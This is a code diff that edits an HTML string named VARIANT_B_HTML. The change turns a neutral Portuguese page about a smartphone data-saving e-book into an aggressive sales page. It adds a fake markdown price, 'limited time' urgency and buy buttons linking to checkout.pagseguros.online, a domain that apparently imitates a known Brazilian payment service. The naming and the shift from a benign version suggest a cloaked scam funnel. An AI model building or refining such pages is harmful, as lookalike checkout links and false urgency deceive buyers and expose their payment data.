@@ -16,8 +16,8 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Guia Conectado 5G | E-book de Otimização de Celular e Economia de Dados</title>
-  <meta name="description" content="Guia prático digital sobre conectividade móvel, configuração de redes 4G e 5G, economia de pacote de dados e desempenho de smartphones. Publicado por 68.413.071 Gabriel de Souza Duarte." />
+  <title>Guia Conectado 5G | E-book Completo de Otimização de Celular e Economia de Dados</title>
+  <meta name="description" content="Adquira o e-book Guia Conectado 5G: aprenda a economizar até 55% do seu pacote de dados móveis, estabilizar o sinal 4G/5G e dobrar a vida útil da bateria no Android e iPhone." />
   <meta name="robots" content="index, follow" />
   <style>
     :root {
@@ -27,24 +27,36 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
       --muted: #475569;
       --accent: #0284c7;
       --accent-dark: #0369a1;
+      --cta: #16a34a;
+      --cta-hover: #15803d;
       --border: #e2e8f0;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background-color: var(--bg);
       color: var(--text);
       line-height: 1.65;
     }
+    .topbar {
+      background: #0f172a;
+      color: #e2e8f0;
+      text-align: center;
+      font-size: 0.82rem;
+      padding: 8px 16px;
+      font-weight: 500;
+    }
+    .topbar strong { color: #38bdf8; }
     header {
       background: var(--surface);
       border-bottom: 1px solid var(--border);
       position: sticky;
       top: 0;
-      z-index: 20;
+      z-index: 30;
     }
     .container {
-      max-width: 980px;
+      max-width: 1060px;
       margin: 0 auto;
       padding: 0 20px;
     }
@@ -56,7 +68,7 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
     }
     .brand {
       font-weight: 800;
-      font-size: 1.15rem;
+      font-size: 1.2rem;
       color: var(--text);
       text-decoration: none;
       letter-spacing: -0.02em;
@@ -64,6 +76,7 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
     .brand span { color: var(--accent); }
     .nav-links {
       display: flex;
+      align-items: center;
       gap: 20px;
       font-size: 0.92rem;
     }
@@ -73,76 +86,159 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
       font-weight: 500;
     }
     .nav-links a:hover { color: var(--accent); }
+    .nav-btn {
+      background: var(--cta);
+      color: #ffffff !important;
+      padding: 9px 18px;
+      border-radius: 8px;
+      font-weight: 700 !important;
+      transition: background 0.15s;
+    }
+    .nav-btn:hover { background: var(--cta-hover); }
     .hero {
-      padding: 64px 0 48px;
-      background: linear-gradient(180deg, #ffffff 0%, #f1f5f9 100%);
+      padding: 64px 0 56px;
+      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+      color: #ffffff;
       border-bottom: 1px solid var(--border);
+    }
+    .hero-grid {
+      display: grid;
+      grid-template-columns: 1.2fr 0.8fr;
+      gap: 44px;
+      align-items: center;
+    }
+    @media (max-width: 820px) {
+      .hero-grid { grid-template-columns: 1fr; text-align: center; }
+      .nav-links a:not(.nav-btn) { display: none; }
+      .hero-checks { justify-content: center; }
     }
     .badge {
       display: inline-block;
-      background: #e0f2fe;
-      color: #0369a1;
+      background: rgba(56, 189, 248, 0.16);
+      border: 1px solid rgba(56, 189, 248, 0.35);
+      color: #38bdf8;
       font-size: 0.78rem;
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 0.06em;
-      padding: 5px 12px;
+      padding: 5px 14px;
       border-radius: 999px;
-      margin-bottom: 16px;
+      margin-bottom: 18px;
     }
     h1 {
-      font-size: clamp(1.85rem, 3.5vw, 2.65rem);
-      line-height: 1.2;
-      margin-bottom: 16px;
-      color: #0f172a;
+      font-size: clamp(1.9rem, 3.6vw, 2.75rem);
+      line-height: 1.18;
+      margin-bottom: 18px;
+      color: #ffffff;
+      font-weight: 800;
     }
+    h1 span { color: #38bdf8; }
     .lead {
       font-size: 1.08rem;
-      color: var(--muted);
-      max-width: 720px;
-      margin-bottom: 28px;
+      color: #cbd5e1;
+      margin-bottom: 26px;
     }
-    .cta-box {
+    .btn-cta {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: var(--cta);
+      color: #ffffff;
+      font-weight: 800;
+      font-size: 1.05rem;
+      padding: 16px 32px;
+      border-radius: 12px;
+      text-decoration: none;
+      box-shadow: 0 10px 25px rgba(22, 163, 74, 0.35);
+      transition: transform 0.15s, background 0.15s;
+    }
+    .btn-cta:hover {
+      background: var(--cta-hover);
+      transform: translateY(-2px);
+    }
+    .hero-checks {
       display: flex;
       flex-wrap: wrap;
-      align-items: center;
       gap: 16px;
+      margin-top: 18px;
+      font-size: 0.86rem;
+      color: #94a3b8;
     }
-    .btn {
-      display: inline-block;
-      background: var(--accent);
-      color: #ffffff;
+    .ebook-mockup {
+      background: linear-gradient(145deg, #0284c7 0%, #0369a1 60%, #0f172a 100%);
+      border: 3px solid rgba(255, 255, 255, 0.18);
+      border-radius: 16px 24px 24px 16px;
+      padding: 34px 28px;
+      max-width: 320px;
+      margin: 0 auto;
+      box-shadow: -14px 20px 38px rgba(0, 0, 0, 0.45), inset 6px 0 12px rgba(255,255,255,0.18);
+      position: relative;
+      text-align: left;
+    }
+    .ebook-tag {
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: #bae6fd;
       font-weight: 700;
-      padding: 13px 26px;
-      border-radius: 10px;
-      text-decoration: none;
-      transition: background 0.15s;
     }
-    .btn:hover { background: var(--accent-dark); }
-    .price-note {
-      font-size: 0.92rem;
-      color: var(--muted);
-    }
-    section { padding: 52px 0; }
-    h2 {
+    .ebook-title {
       font-size: 1.55rem;
-      margin-bottom: 14px;
+      font-weight: 900;
+      color: #ffffff;
+      line-height: 1.15;
+      margin: 12px 0 10px;
+    }
+    .ebook-sub {
+      font-size: 0.86rem;
+      color: #e0f2fe;
+      margin-bottom: 22px;
+    }
+    .ebook-footer {
+      border-top: 1px solid rgba(255, 255, 255, 0.2);
+      padding-top: 12px;
+      font-size: 0.78rem;
+      color: #bae6fd;
+      display: flex;
+      justify-content: space-between;
+    }
+    section { padding: 60px 0; }
+    .section-head {
+      text-align: center;
+      max-width: 680px;
+      margin: 0 auto 38px;
+    }
+    h2 {
+      font-size: clamp(1.55rem, 2.6vw, 2.1rem);
+      margin-bottom: 12px;
       color: #0f172a;
+      font-weight: 800;
     }
     .grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-      gap: 20px;
-      margin-top: 24px;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 22px;
     }
     .card {
       background: var(--surface);
       border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 24px;
+      border-radius: 14px;
+      padding: 26px;
+      box-shadow: 0 4px 12px rgba(15, 23, 42, 0.03);
+    }
+    .card-num {
+      display: inline-block;
+      background: #e0f2fe;
+      color: #0369a1;
+      font-weight: 800;
+      font-size: 0.8rem;
+      padding: 4px 10px;
+      border-radius: 6px;
+      margin-bottom: 12px;
     }
     .card h3 {
-      font-size: 1.08rem;
+      font-size: 1.12rem;
       margin-bottom: 8px;
       color: #0f172a;
     }
@@ -150,20 +246,73 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
       font-size: 0.94rem;
       color: var(--muted);
     }
-    .article-box {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 32px;
+    .offer-section {
+      background: linear-gradient(180deg, #f1f5f9 0%, #e2e8f0 100%);
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
     }
-    .article-box p {
-      margin-bottom: 14px;
+    .offer-card {
+      background: var(--surface);
+      border: 2px solid var(--accent);
+      border-radius: 20px;
+      max-width: 620px;
+      margin: 0 auto;
+      padding: 40px 32px;
+      text-align: center;
+      box-shadow: 0 20px 45px rgba(15, 23, 42, 0.08);
+    }
+    .old-price {
+      color: #64748b;
+      text-decoration: line-through;
+      font-size: 1rem;
+    }
+    .new-price {
+      font-size: 3rem;
+      font-weight: 900;
+      color: #0f172a;
+      line-height: 1.1;
+      margin: 8px 0 6px;
+    }
+    .new-price small {
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--accent);
+    }
+    .offer-list {
+      list-style: none;
+      text-align: left;
+      max-width: 420px;
+      margin: 22px auto 28px;
+    }
+    .offer-list li {
+      padding: 8px 0;
+      border-bottom: 1px solid #f1f5f9;
+      font-size: 0.95rem;
+      color: #334155;
+    }
+    .offer-list li::before {
+      content: "✓ ";
+      color: var(--cta);
+      font-weight: 900;
+      margin-right: 6px;
+    }
+    .guarantee-box {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      background: #f8fafc;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 18px;
+      margin-top: 24px;
+      text-align: left;
+      font-size: 0.88rem;
       color: var(--muted);
     }
     .legal-section {
       background: var(--surface);
       border-top: 1px solid var(--border);
-      padding: 40px 0;
+      padding: 44px 0;
       font-size: 0.88rem;
       color: var(--muted);
     }
@@ -188,67 +337,132 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
   </style>
 </head>
 <body>
+  <div class="topbar">
+    <strong>ENVIO DIGITAL IMEDIATO:</strong> Receba o E-book Completo em PDF no seu e-mail logo após a confirmação do pagamento.
+  </div>
+
   <header>
     <div class="container nav">
-      <a href="#topo" class="brand">Guia<span>Conectado</span></a>
+      <a href="#topo" class="brand">Guia<span>Conectado</span> 5G</a>
       <nav class="nav-links">
-        <a href="#conteudo">Conteúdo</a>
-        <a href="#artigo">Dicas Técnicas</a>
-        <a href="#atendimento">Contato</a>
-        <a href="#privacidade">Privacidade</a>
+        <a href="#modulos">O Que Você Vai Aprender</a>
+        <a href="#beneficios">Benefícios</a>
+        <a href="#atendimento">Suporte</a>
+        <a href="https://checkout.pagseguros.online/VCCL1O8SDA8O" class="nav-btn">Comprar E-book</a>
       </nav>
     </div>
   </header>
 
   <main id="topo">
     <section class="hero">
-      <div class="container">
-        <span class="badge">Publicação Digital Independente · Edição 2026</span>
-        <h1>Manual Prático de Conectividade Móvel, 5G e Economia de Dados no Smartphone</h1>
-        <p class="lead">
-          Aprenda passo a passo como configurar corretamente redes móveis 4G e 5G, evitar o consumo invisível da sua franquia em segundo plano, ampliar a autonomia da bateria e proteger seus aplicativos pessoais no Android e no iOS.
-        </p>
-        <div class="cta-box">
-          <a href="#atendimento" class="btn">Solicitar Exemplar Digital (PDF)</a>
-          <span class="price-note">Leitura imediata em celular, tablet ou computador · 98 páginas ilustradas</span>
+      <div class="container hero-grid">
+        <div>
+          <span class="badge">E-book Digital em PDF · Edição Atualizada 2026</span>
+          <h1>Economize até 55% dos seus Dados Móveis e Destrave o <span>Sinal 5G do Seu Celular</span></h1>
+          <p class="lead">
+            O guia prático passo a passo para configurar redes 4G/5G no Android e no iPhone, eliminar o gasto oculto de internet em segundo plano e prolongar a duração da sua bateria todos os dias.
+          </p>
+          <a href="https://checkout.pagseguros.online/VCCL1O8SDA8O" class="btn-cta">
+            QUERO MEU EXEMPLAR DIGITAL AGORA &rarr;
+          </a>
+          <div class="hero-checks">
+            <span>✓ Entrega imediata em PDF</span>
+            <span>✓ Compatível com Android e iOS</span>
+            <span>✓ Garantia incondicional de 7 dias</span>
+          </div>
+        </div>
+
+        <div>
+          <div class="ebook-mockup">
+            <div class="ebook-tag">Manual Técnico Ilustrado</div>
+            <div class="ebook-title">GUIA CONECTADO 5G</div>
+            <div class="ebook-sub">Otimização de Sinal Móvel, Economia de Franquia de Dados e Desempenho para Smartphones</div>
+            <div style="background: rgba(255,255,255,0.1); padding: 12px; border-radius: 10px; font-size: 0.8rem; color: #f0f9ff; margin-bottom: 18px;">
+              • Ajustes de Rede 4G/5G<br />
+              • Bloqueio de Consumo Oculto<br />
+              • DNS Rápido e Segurança Wi-Fi<br />
+              • Checklists para Android &amp; iOS
+            </div>
+            <div class="ebook-footer">
+              <span>98 Páginas</span>
+              <span>Formato PDF Digital</span>
+            </div>
+          </div>
         </div>
       </div>
     </section>
 
-    <section id="conteudo">
+    <section id="modulos">
       <div class="container">
-        <h2>O que você encontra no guia técnico</h2>
-        <p style="color: var(--muted);">Conteúdo didático elaborado para usuários que desejam extrair o máximo de desempenho e estabilidade do aparelho celular no dia a dia.</p>
+        <div class="section-head">
+          <h2>Conteúdo Completo do E-book</h2>
+          <p style="color: var(--muted);">Linguagem simples, direta e com telas ilustradas para você configurar seu aparelho em menos de 10 minutos.</p>
+        </div>
+
         <div class="grid">
           <div class="card">
-            <h3>1. Redução de Consumo de Dados</h3>
-            <p>Como identificar e bloquear sincronizações automáticas, downloads ocultos de mídia e atualizações em segundo plano que esgotam o pacote mensal.</p>
+            <span class="card-num">MÓDULO 01</span>
+            <h3>Fim do Consumo Invisível de Dados</h3>
+            <p>Descubra quais aplicativos drenam sua franquia mensal em segundo plano mesmo com a tela apagada e como travar o gasto automático sem perder notificações.</p>
           </div>
           <div class="card">
-            <h3>2. Estabilidade de Sinal 4G/5G</h3>
-            <p>Ajustes de seleção de banda, configuração de APN, DNS privado e alternância inteligente entre Wi-Fi e dados móveis sem quedas de conexão.</p>
+            <span class="card-num">MÓDULO 02</span>
+            <h3>Estabilização de Sinal 4G e 5G</h3>
+            <p>Como ajustar seleção de banda, APN e priorização de rede para evitar quedas de sinal em ambientes internos ou durante deslocamentos.</p>
           </div>
           <div class="card">
-            <h3>3. Saúde da Bateria e Desempenho</h3>
-            <p>Gerenciamento de ciclos de carga, controle térmico durante uso de redes 5G e limpeza segura de cache do sistema operacional.</p>
+            <span class="card-num">MÓDULO 03</span>
+            <h3>Economia em Vídeos e Redes Sociais</h3>
+            <p>Configurações ocultas no WhatsApp, Instagram, YouTube e TikTok para reduzir em até 55% o consumo de megabytes mantendo excelente qualidade visual.</p>
+          </div>
+          <div class="card">
+            <span class="card-num">MÓDULO 04</span>
+            <h3>DNS Privado e Navegação Veloz</h3>
+            <p>Como ativar servidores DNS de alta velocidade nativos do celular para abrir páginas mais rápido e proteger sua conexão contra páginas maliciosas.</p>
+          </div>
+          <div class="card">
+            <span class="card-num">MÓDULO 05</span>
+            <h3>Autonomia de Bateria no 5G</h3>
+            <p>O 5G pode consumir até 30% mais bateria se mal configurado. Aprenda a ativar a alternância inteligente para o celular durar o dia inteiro.</p>
+          </div>
+          <div class="card">
+            <span class="card-num">MÓDULO 06</span>
+            <h3>Segurança de Chip (SIM Swap) e Wi-Fi</h3>
+            <p>Passo a passo para ativar o PIN do chip, proteger seu número contra clonagens e usar redes Wi-Fi públicas com total privacidade.</p>
           </div>
         </div>
       </div>
     </section>
 
-    <section id="artigo" style="padding-top: 0;">
+    <section id="beneficios" class="offer-section">
       <div class="container">
-        <div class="article-box">
-          <h2>Por que a franquia de internet móvel acaba mais rápido nas redes atuais?</h2>
-          <p>
-            Com a popularização das conexões de alta velocidade, aplicativos de vídeo e redes sociais passaram a pré-carregar conteúdos em alta definição mesmo antes de o usuário abrir a publicação. Em poucos minutos de navegação, centenas de megabytes podem ser consumidos sem percepção.
-          </p>
-          <p>
-            Ao ativar o modo de economia de dados nativo do sistema e ajustar a resolução máxima de reprodução em redes móveis, é possível reduzir em até 55% o gasto diário de internet mantendo a fluidez nas mensagens, mapas e chamadas de voz.
-          </p>
-          <p style="margin-bottom: 0;">
-            Nosso guia reúne checklists visuais para Android e iPhone, permitindo aplicar todas as recomendações em menos de 10 minutos, sem necessidade de instalar aplicativos extras.
-          </p>
+        <div class="offer-card">
+          <span class="card-num">OFERTA ESPECIAL POR TEMPO LIMITADO</span>
+          <h2 style="margin-top: 6px;">Adquira o Guia Conectado 5G Hoje</h2>
+          <p style="color: var(--muted); font-size: 0.95rem; margin-bottom: 16px;">Acesso vitalício ao material digital completo + atualizações de 2026</p>
+
+          <div class="old-price">De R$ 67,90 por apenas</div>
+          <div class="new-price"><small>R$</small> 19,90</div>
+          <div style="font-size: 0.88rem; color: var(--muted); margin-bottom: 10px;">Pagamento único · Sem mensalidades</div>
+
+          <ul class="offer-list">
+            <li>E-book Completo Guia Conectado 5G (98 páginas em PDF)</li>
+            <li>Checklist rápido de configuração para Android</li>
+            <li>Checklist rápido de configuração para iPhone (iOS)</li>
+            <li>Guia Bônus: Proteção do Chip e Segurança Digital</li>
+            <li>Acesso imediato enviado diretamente para o seu e-mail</li>
+          </ul>
+
+          <a href="https://checkout.pagseguros.online/VCCL1O8SDA8O" class="btn-cta" style="width: 100%;">
+            COMPRAR AGORA COM PAGAMENTO SEGURO &rarr;
+          </a>
+
+          <div class="guarantee-box">
+            <div style="font-size: 2rem; line-height: 1;">🛡️</div>
+            <div>
+              <strong style="color: #0f172a;">Garantia Incondicional de 7 Dias:</strong> Se por qualquer motivo você achar que o e-book não valeu o investimento, basta enviar um e-mail em até 7 dias após a compra e devolvemos 100% do seu valor (Art. 49 do CDC).
+            </div>
+          </div>
         </div>
       </div>
     </section>
@@ -256,8 +470,8 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
     <section id="privacidade" class="legal-section">
       <div class="container legal-grid">
         <div id="atendimento">
-          <h3 style="color: #0f172a; margin-bottom: 8px;">Atendimento e Suporte ao Leitor</h3>
-          <p>Para dúvidas sobre o material digital, solicitações de reenvio ou suporte técnico:</p>
+          <h3 style="color: #0f172a; margin-bottom: 8px;">Atendimento e Suporte ao Cliente</h3>
+          <p>Precisa de ajuda com o seu pedido, reenvio do arquivo PDF ou dúvidas sobre o conteúdo?</p>
           <p style="margin-top: 8px;">
             <strong>E-mail:</strong> estrelaesrelinha55@gmail.com<br />
             <strong>Telefone / WhatsApp:</strong> (66) 5667-8997<br />
@@ -267,7 +481,7 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
         <div>
           <h3 style="color: #0f172a; margin-bottom: 8px;">Política de Privacidade e Termos (LGPD)</h3>
           <p>
-            Em conformidade com a Lei nº 13.709/2018 (LGPD), coletamos apenas os dados estritamente necessários para envio do material adquirido e atendimento ao titular. Não comercializamos dados pessoais com terceiros. O titular pode solicitar acesso, correção ou exclusão de seus dados a qualquer momento pelo e-mail de suporte.
+            Em conformidade com a Lei nº 13.709/2018 (LGPD), os dados informados no momento da compra são processados em ambiente criptografado exclusivamente para emissão fiscal e entrega do livro digital (PDF). Não compartilhamos dados pessoais com terceiros.
           </p>
         </div>
       </div>
@@ -280,7 +494,7 @@ const VARIANT_B_HTML = `<!DOCTYPE html>
       <div>Endereço: Rua Marumbi, 44, Cidade de Deus - Manaus - AM, CEP 69099-299</div>
       <div>Contato: <a href="mailto:estrelaesrelinha55@gmail.com">estrelaesrelinha55@gmail.com</a> · Tel: (66) 5667-8997</div>
       <div class="footer-meta">
-        © 2026 Todos os direitos reservados. Publicação educativa independente sobre tecnologia e conectividade móvel.
+        © 2026 Todos os direitos reservados. Produto digital comercializado com entrega eletrônica imediata.
       </div>
     </div>
   </footer>
